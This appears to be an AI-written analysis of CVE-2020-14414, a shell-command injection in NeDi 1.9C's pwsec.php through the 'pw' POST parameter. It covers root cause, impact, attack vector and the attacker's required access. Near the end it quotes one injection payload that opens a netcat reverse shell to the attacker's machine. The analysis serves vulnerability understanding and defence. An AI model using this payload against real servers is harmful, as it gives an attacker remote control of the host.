Based on the provided content, here's an analysis of CVE-2020-14414:

**Root cause of vulnerability:**

*   The vulnerability stems from improper escaping of shell metacharacters within the `pwsec.php` file of NeDi 1.9C.

**Weaknesses/vulnerabilities present:**

*   **Remote Command Execution (RCE):** The application fails to properly sanitize user-supplied input, specifically within a POST request. This allows an attacker to inject arbitrary shell commands.
*   **Insufficient Input Validation:** The `pwsec.php` script does not sufficiently validate or escape shell metacharacters included in the `pw` parameter from a POST request.
*   **CSRF Potential:** The exploit can potentially be executed through Cross-Site Request Forgery (CSRF), making it possible to trigger the vulnerability without direct user interaction if the user is authenticated.

**Impact of exploitation:**

*   An attacker can achieve arbitrary command execution on the server hosting NeDi 1.9C.
*   Successful exploitation allows the attacker to gain control of the server, enabling them to perform various malicious activities.  Specifically, a reverse shell can be spawned to the attacker's machine.

**Attack vectors:**

*   **HTTP POST Request:** The attack is carried out by sending a crafted HTTP POST request to the `pwsec.php` endpoint.
*   **`pw` Parameter:** The vulnerable input is within the `pw` parameter of the POST request.

**Required attacker capabilities/position:**

*   **Authentication:** The attacker needs to have valid authentication credentials to log in to the NeDi application before they can exploit the vulnerability, as noted by "Login with the credential." in the steps to reproduce.
*   **Network Access:** The attacker must have network access to the server running NeDi 1.9C.
*   **Crafted Payload:** The attacker must be able to craft a malicious payload containing shell metacharacters (e.g. `';nc ip port -e /bin/bash;'`.)
